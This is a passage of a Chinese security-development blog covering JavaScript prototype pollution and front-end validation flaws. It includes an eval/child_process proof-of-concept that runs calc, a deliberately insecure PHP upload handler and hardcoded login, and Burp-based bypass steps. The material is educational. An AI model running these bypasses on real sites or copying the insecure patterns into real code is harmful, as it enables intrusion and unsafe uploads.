class="line">let foo = &#123;bar:1&#125;</span><br><span class="line">console.log(foo.bar)    // 输出为1</span><br><span class="line"></span><br><span class="line">foo.__proto__.bar = &#x27;x&#x27;     // 修改原型</span><br><span class="line">console.log(foo.bar)    // 输出为 1，因为查找顺序的原因</span><br><span class="line"></span><br><span class="line">let zoo = &#123;&#125;</span><br><span class="line">console.log(zoo.bar)    // 输出为 &#x27;x&#x27;，因为zoo的原型指向foo.__proto__，即最底层的对象Object</span><br></pre></td></tr></table></figure></li><li><p><strong>原型链结构图</strong></p><p><code>Object.prototype</code> 是 JavaScript 中所有对象的原型对象，它是 <strong>所有对象的原型链</strong> 的终极基类。几乎在 JavaScript 中创建的所有对象，都会继承 <code>Object.prototype</code> 中的方法和属性。如果你访问一个对象的某个属性或方法时，JavaScript 会沿着原型链从当前对象开始查找，直到它找到 <code>Object.prototype</code> 为止。如果 <code>Object.prototype</code> 中没有该属性或方法，JavaScript 会返回 <code>undefined</code>。</p><p>以下面的图为例：<code>person.__proto__</code> 是与 <code>Person.prototype</code> 等价的，而 <code>Person.prototype.__proto__</code> 是指向 <code>Object.prototype</code> 的，再往下 <code>Object.prototype.__proto__</code> 指向 <code>null</code>。</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20250224210756528.png" alt="image-20250224210756528" /></p></li></ol><h2 id="原型链污染的原理"><a class="markdownIt-Anchor" href="#原型链污染的原理"></a> 原型链污染的原理</h2><p>在 JavaScript 中，对象通过原型链继承属性和方法。如果攻击者能够通过某些方式修改对象的原型（即 <code>prototype</code>），构造函数和原型属性，就可能导致整个对象模型的行为发生异常。同时，所有继承了被污染原型的对象都会受到影响。原型链污染通常会导致拒绝服务、篡改程序执行流程、导致远程执行代码等漏洞。</p><h2 id="原型链污染的利用"><a class="markdownIt-Anchor" href="#原型链污染的利用"></a> 原型链污染的利用</h2><p>原型链污染配合RCE：</p><p>有原型链污染的前提之下，我们可以控制基类的成员，赋值为一串恶意代码，从而造成代码注入。</p><p>例如下面的代码：通过原型链bar属性执行命令打开计算器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">// 创建一个包含属性 bar 的对象 foo，并将 bar 设置为 1</span><br><span class="line">let foo = &#123;bar: 1&#125;;</span><br><span class="line"></span><br><span class="line">// 输出 foo 对象的 bar 属性，预期输出为 1</span><br><span class="line">console.log(foo.bar); // 输出: 1</span><br><span class="line"></span><br><span class="line">// 修改 foo 对象的原型链上的 bar 属性，将其设置为执行命令 &#x27;require(\&#x27;child_process\&#x27;).execSync(\&#x27;calc\&#x27;);&#x27;，从而调用计算器</span><br><span class="line">foo.__proto__.bar = &#x27;require(\&#x27;child_process\&#x27;).execSync(\&#x27;calc\&#x27;);&#x27;;</span><br><span class="line"></span><br><span class="line">// 输出 foo 对象的 bar 属性，预期输出仍为 1，因为直接属性优先于原型链上的属性</span><br><span class="line">console.log(foo.bar); // 输出: 1</span><br><span class="line"></span><br><span class="line">// 创建一个空对象 zoo</span><br><span class="line">let zoo = &#123;&#125;;</span><br><span class="line"></span><br><span class="line">// 使用 eval 执行 zoo 对象的 bar 属性，由于 zoo 对象没有 bar 属性，会导致 ReferenceError</span><br><span class="line">//调用计算机</span><br><span class="line">console.log(eval(zoo.bar));</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="实际案例"><a class="markdownIt-Anchor" href="#实际案例"></a> 实际案例</h2><p>因为原型链污染的条件苛刻，一般只在CTF比赛中作为考题出现，现实中比较少</p><ol><li><p>CTF</p><ul><li><p>CTFshow的Web334-344</p></li><li><p>CTF中的nodejs考点：<a href="https://f1veseven.github.io/2022/04/03/ctf-nodejs-zhi-yi-xie-xiao-zhi-shi/">ctf-nodejs之一些小知识</a></p></li></ul></li><li><p>yapi token注入漏洞</p><p><a href="https://blog.csdn.net/weixin_42353842/article/details/127960229">yapi token注入漏洞</a></p></li></ol>]]></content>
      
      
      <categories>
          
          <category> 安全开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> javascript </tag>
            
            <tag> 安全开发 </tag>
            
            <tag> NodeJS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>『安全开发』JS安全开发（一）原生开发</title>
      <link href="/posts/cdb6.html"/>
      <url>/posts/cdb6.html</url>
      
        <content type="html"><![CDATA[<h1 id="js-基本语法和-js-dom"><a class="markdownIt-Anchor" href="#js-基本语法和-js-dom"></a> JS 基本语法和 JS DOM</h1><p>参考：<a href="https://isoda.top/posts/d00f.html">『web前端开发』javascript学习</a></p><h1 id="js原生开发"><a class="markdownIt-Anchor" href="#js原生开发"></a> JS原生开发</h1><p>什么是JS原生开发？</p><p>JS原生开发是指：在不依赖任何第三方框架或库（如React、Vue、Angular等）的情况下，使用原生的JavaScript语言进行开发。</p><h2 id="案例文件上传过滤"><a class="markdownIt-Anchor" href="#案例文件上传过滤"></a> 案例：文件上传过滤</h2><ol><li><p><strong>功能</strong>：在前端通过JS实现后缀过滤，后端PHP实现上传处理</p></li><li><p><strong>代码</strong></p><p><strong>1）前端 JS + HTML 代码</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">function</span> <span class="title function_">CheckFileExt</span>(<span class="params">filename</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> flag=<span class="literal">false</span>;</span></span><br><span class="line"><span class="language-javascript">    <span class="comment">//规定白名单上传后缀</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> exts=[<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>,<span class="string">&#x27;jpg&#x27;</span>];</span></span><br><span class="line"><span class="language-javascript">    <span class="comment">//1.php 1.php.jpg 接受传递的后缀名</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> index=filename.<span class="title function_">lastIndexOf</span>(<span class="string">&quot;.&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> ext = filename.<span class="title function_">substr</span>(index+<span class="number">1</span>);</span></span><br><span class="line"><span class="language-javascript">    <span class="comment">//进行后缀检测</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;exts.<span class="property">length</span>;i++)&#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">if</span>(ext==exts[i])&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> flag=<span class="literal">true</span>;</span></span><br><span class="line"><span class="language-javascript">        <span class="title function_">alert</span>(<span class="string">&#x27;文件后缀正确！&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">break</span>;</span></span><br><span class="line"><span class="language-javascript">      &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">if</span>(!flag)&#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="title function_">alert</span>(<span class="string">&#x27;文件后缀错误！&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">      location.<span class="title function_">reload</span>(<span class="literal">true</span>);</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 表单用于文件上传，指定了上传的目标地址为 &quot;upload.php&quot;，使用 POST 方法提交，并设置 enctype 为 &quot;multipart/form-data&quot; --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;upload.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 为文件上传输入框添加标签 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;file&quot;</span>&gt;</span>选择文件:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 这是一个包含文件上传输入框的 HTML 代码，并且在用户选择文件时触发 CheckFileExt 函数 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">id</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;f&quot;</span> <span class="attr">onchange</span>=<span class="string">&quot;CheckFileExt(this.value)&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 提交按钮 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span>&gt;</span>上传文件<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>2）后端PHP代码</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$name</span>=<span class="variable">$_FILES</span>[<span class="string">&#x27;f&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="variable">$type</span>=<span class="variable">$_FILES</span>[<span class="string">&#x27;f&#x27;</span>][<span class="string">&#x27;type&#x27;</span>];</span><br><span class="line"><span class="variable">$size</span>=<span class="variable">$_FILES</span>[<span class="string">&#x27;f&#x27;</span>][<span class="string">&#x27;size&#x27;</span>];</span><br><span class="line"><span class="variable">$tmp_name</span>=<span class="variable">$_FILES</span>[<span class="string">&#x27;f&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line"><span class="variable">$error</span>=<span class="variable">$_FILES</span>[<span class="string">&#x27;f&#x27;</span>][<span class="string">&#x27;error&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$tmp_name</span>,<span class="string">&#x27;upload/&#x27;</span>.<span class="variable">$name</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;script&gt;alert(&quot;上传成功!&quot;)&lt;/script&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><strong>安全问题</strong></p><p>可以直接在前端看到JS文件上传过滤代码，从而分析并绕过</p><ul><li><p>1）利用开发者工具绕过：<a href="https://blog.csdn.net/u013250861/article/details/143040605">利用浏览器的开发者工具实时修改网页前端JS代码（实现绕过）</a></p><blockquote><p>注意：不能直接在元素中修改，浏览器一般都会已经在内存里加载了这段代码，要重新加载代码只能靠刷新，然而刷新会丢失我们所作的修改。</p></blockquote></li><li><p>2）禁用 JS</p></li><li><p>3）抓包</p><p><strong>JS代码的原理是在浏览器端执行，执行后发送数据包。所以如果我对这个功能接口进行安全测试，使用Burp suite抓包，在数据包中修改文件拓展，并不会被前端JS中的后缀检测代码拦截。</strong></p><p>所以测试时不仅要关注前端的校验，还要确保后端有足够的安全控制来防止恶意文件上传。</p></li></ul></li></ol><h1 id="js导入库开发"><a class="markdownIt-Anchor" href="#js导入库开发"></a> JS导入库开发</h1><h2 id="js第三方库"><a class="markdownIt-Anchor" href="#js第三方库"></a> JS第三方库</h2><p>什么是JS导入库开发？</p><p>其实就是导入第三方库来JS代码开发（和react、flask这类框架不同），将外部的JavaScript代码或模块引入到项目中，以便在项目中使用这些代码或功能。通过导入库，你可以利用这些已有的功能和工具，从而提高开发效率，避免重复造轮子。</p><p>常用的JS第三方库：</p><ul><li><strong>jQuery</strong>：一个常用的 DOM 操作库，简化了浏览器中的 DOM 操作和事件处理</li><li><strong>Lodash</strong>：提供了很多常用的 JavaScript 工具函数，用于数组、对象、函数等操作</li><li><strong>Axios</strong>：一个用于处理 HTTP 请求的库，基于 Promise API</li></ul><h2 id="js-导入库开发案例"><a class="markdownIt-Anchor" href="#js-导入库开发案例"></a> JS 导入库开发案例</h2><h3 id="案例1登录验证"><a class="markdownIt-Anchor" href="#案例1登录验证"></a> 案例1：登录验证</h3><ol><li><p>功能：基于Query库和Ajax技术异步请求实现用户的登录验证</p><blockquote><p>Ajax 是一种在网页中与服务器进行异步交互的技术，允许网页在不重新加载整个页面的情况下，后续触发某些操作（如点击按钮）后再异步发送请求，网页接收到服务器返回的数据后动态更新内容，避免页面刷新。</p><p>例如：谷歌翻译，用户输入文本的时候动态更新翻译内容</p></blockquote></li><li><p>代码</p><p>1）前端 JS + HTML 代码</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- 引入 jQuery 库 --&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;js/jquery-1.12.4.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line">&lt;!-- <span class="title class_">JavaScript</span> 代码 --&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">  // 这段代码通过 $(&quot;button&quot;) 选择页面上的所有 &lt;button&gt; 元素，并为这些按钮添加一个 点击事件监听器。当用户点击按钮时，事件处理器中的回调函数会被执行。</span><br><span class="line">  $(&quot;button&quot;).click(function ()&#123;</span><br><span class="line">    // 当按钮被点击时，AJAX 请求会被触发</span><br><span class="line">    $.ajax(&#123;</span><br><span class="line">      type: &#x27;POST&#x27;,// HTTP请求方法（GET、POST等）</span><br><span class="line">      url: &#x27;logincheck.php&#x27;,// 请求的URL</span><br><span class="line">      data: &#123;// 发送到服务器的数据（可选）</span><br><span class="line">        myuser:$(&#x27;.user&#x27;).val(),// 获取类名为 .user 的元素的值</span><br><span class="line">        mypass:$(&#x27;.pass&#x27;).val()</span><br><span class="line">      &#125;,</span><br><span class="line">        </span><br><span class="line">      //  AJAX 请求成功时执行的回调函数。</span><br><span class="line">      success: function (res)&#123;</span><br><span class="line">        console.log(res); // 服务器响应的数据</span><br><span class="line">        if(res[&#x27;infoCode&#x27;]==1)&#123;</span><br><span class="line">          alert(&#x27;登录成功&#x27;);</span><br><span class="line">          // 登录成功处理事件</span><br><span class="line">          //location.href=&#x27;index.php&#x27;;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">          alert(&#x27;登录失败&#x27;);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;,</span><br><span class="line"></span><br><span class="line">      // 请求失败时的回调函数</span><br><span class="line">      error: function(xhr, status, error) &#123;  </span><br><span class="line">        console.log(&quot;请求失败！&quot;);</span><br><span class="line">        console.log(error);                    // 错误信息</span><br><span class="line">      &#125;</span><br><span class="line">      </span><br><span class="line">      // 指定服务器响应的数据类型</span><br><span class="line">      dataType: &#x27;json&#x27;,</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;);</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- HTML代码 --&gt;</span><br><span class="line">&lt;div class=&quot;login&quot;&gt;</span><br><span class="line">    &lt;!-- 登录标题 --&gt;</span><br><span class="line">    &lt;h2&gt;后台登录&lt;/h2&gt;</span><br><span class="line">    &lt;!-- 用户名标签和输入框 --&gt;</span><br><span class="line">    &lt;label for=&quot;username&quot;&gt;用户名:&lt;/label&gt;</span><br><span class="line">    &lt;input type=&quot;text&quot; name=&quot;username&quot; id=&quot;username&quot; class=&quot;user&quot;&gt;</span><br><span class="line">    &lt;!-- 密码标签和输入框 --&gt;</span><br><span class="line">    &lt;label for=&quot;password&quot;&gt;密码:&lt;/label&gt;</span><br><span class="line">    &lt;input type=&quot;password&quot; name=&quot;password&quot; id=&quot;password&quot; class=&quot;pass&quot;&gt;</span><br><span class="line">    &lt;!-- 登录按钮 --&gt;</span><br><span class="line">    &lt;button&gt;登录&lt;/button&gt;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure><p>2）后端php代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 从 POST 请求中获取用户提交的用户名和密码</span></span><br><span class="line"><span class="variable">$user</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;myuser&#x27;</span>];</span><br><span class="line"><span class="variable">$pass</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;mypass&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// $success 是一个关联数组变量，通过使用 &#x27;msg&#x27; 作为键，将 &#x27;ok&#x27; 作为值存储在其中。</span></span><br><span class="line"><span class="variable">$success</span> = <span class="keyword">array</span>(<span class="string">&#x27;msg&#x27;</span> =&gt; <span class="string">&#x27;ok&#x27;</span>);**</span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查用户名和密码是否匹配，注意：真实情况下，应该在数据库中进行验证获取用户信息</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$user</span> == <span class="string">&#x27;xiaodi&#x27;</span> &amp;&amp; <span class="variable">$pass</span> == <span class="string">&#x27;123456&#x27;</span>) &#123;</span><br><span class="line">    <span class="comment">// 如果匹配，设置信息代码为1表示登录成功，并进行相应的处理</span></span><br><span class="line">    <span class="variable">$success</span>[<span class="string">&#x27;infoCode&#x27;</span>] = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;script&gt;location.href=&quot;index.php&quot;;&lt;/script&gt;&#x27;</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// 如果不匹配，设置信息代码为0表示登录失败</span></span><br><span class="line">    <span class="variable">$success</span>[<span class="string">&#x27;infoCode&#x27;</span>] = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将结果以 JSON 格式输出</span></span><br><span class="line"><span class="comment">//必须要回调输出，不然前端无法获取infocode的值</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$success</span>);**</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p><strong>安全问题</strong></p><p>注意登录后的跳转代码：</p><ul><li>前端JS中：<code>location.href='index.php';</code>，</li><li>后端PHP中：<code>echo '&lt;script&gt;location.href=&quot;index.php&quot;;&lt;/script&gt;'</code></li></ul><p>这两种方法实际只有一个存在，如果这个跳转代码写在了JS中则可以进行绕过，如果是后端就不可以。</p><p>如果写在前端JS中的话：这里我们直接随便输入一个用户名密码，用bp发送并截取服务器返回的数据包，将数据包中的 <code>res['infoCode']</code> 改成1再放开，浏览器执行JS脚本并成功登录。</p></li></ol><h3 id="案例2商品购买"><a class="markdownIt-Anchor" href="#案例2商品购买"></a> 案例2：商品购买</h3><ol><li><p>功能：基于Query库和Ajax技术异步请求实现商品购买</p></li><li><p>代码</p><p>1）前端 JS + HTML 代码</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 设置文档的字符集为UTF-8 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 设置页面标题 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>商品购买<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 商品图片 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;iphone.jpg&quot;</span> <span class="attr">width</span>=<span class="string">&quot;300&quot;</span> <span class="attr">height</span>=<span class="string">&quot;300&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 当前拥有的金钱 --&gt;</span></span><br><span class="line">金钱：10000<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 商品价格 --&gt;</span></span><br><span class="line">商品价格：8888<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 输入购买数量的文本框 --&gt;</span></span><br><span class="line">数量：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;number&quot;</span> <span class="attr">class</span>=<span class="string">&quot;number&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 购买按钮 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span>&gt;</span>购买<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 引入 jQuery 库 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;js/jquery-1.12.4.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- JavaScript 代码 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 当购买按钮被点击时执行以下函数</span></span></span><br><span class="line"><span class="language-javascript">    $(<span class="string">&quot;button&quot;</span>).<span class="title function_">click</span>(<span class="keyword">function</span> (<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// 使用 AJAX 发送 POST 请求到 &#x27;shop.php&#x27;</span></span></span><br><span class="line"><span class="language-javascript">        **$.<span class="title function_">ajax</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">type</span>: <span class="string">&#x27;POST&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">url</span>: <span class="string">&#x27;shop.php&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="comment">// 发送的数据，包括购买数量</span></span></span><br><span class="line"><span class="language-javascript">            <span class="attr">data</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">num</span>: $(<span class="string">&#x27;.number&#x27;</span>).<span class="title function_">val</span>(),</span></span><br><span class="line"><span class="language-javascript">            &#125;,</span></span><br><span class="line"><span class="language-javascript">            <span class="comment">// 请求成功时执行的函数</span></span></span><br><span class="line"><span class="language-javascript">            <span class="attr">success</span>: <span class="keyword">function</span> (<span class="params">res</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="comment">// 在控制台输出返回的数据</span></span></span><br><span class="line"><span class="language-javascript">                <span class="variable language_">console</span>.<span class="title function_">log</span>(res);</span></span><br><span class="line"><span class="language-javascript">                <span class="comment">// 如果返回的信息代码为1，表示购买成功</span></span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">if</span>(res[<span class="string">&#x27;infoCode&#x27;</span>] == <span class="number">1</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">                    <span class="comment">// 弹出成功提示</span></span></span><br><span class="line"><span class="language-javascript">                    <span class="title function_">alert</span>(<span class="string">&#x27;购买成功&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">                    <span class="comment">// 购买成功的流程（你可以在这里添加额外的处理）</span></span></span><br><span class="line"><span class="language-javascript">                &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="language-javascript">                    <span class="comment">// 如果信息代码不为1，表示购买失败</span></span></span><br><span class="line"><span class="language-javascript">                    <span class="comment">// 弹出失败提示</span></span></span><br><span class="line"><span class="language-javascript">                    <span class="title function_">alert</span>(<span class="string">&#x27;购买失败&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">                &#125;</span></span><br><span class="line"><span class="language-javascript">            &#125;,</span></span><br><span class="line"><span class="language-javascript">            <span class="comment">// 指定返回的数据类型为 JSON</span></span></span><br><span class="line"><span class="language-javascript">            <span class="attr">dataType</span>: <span class="string">&#x27;json&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">        &#125;);**</span></span><br><span class="line"><span class="language-javascript">    &#125;);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span 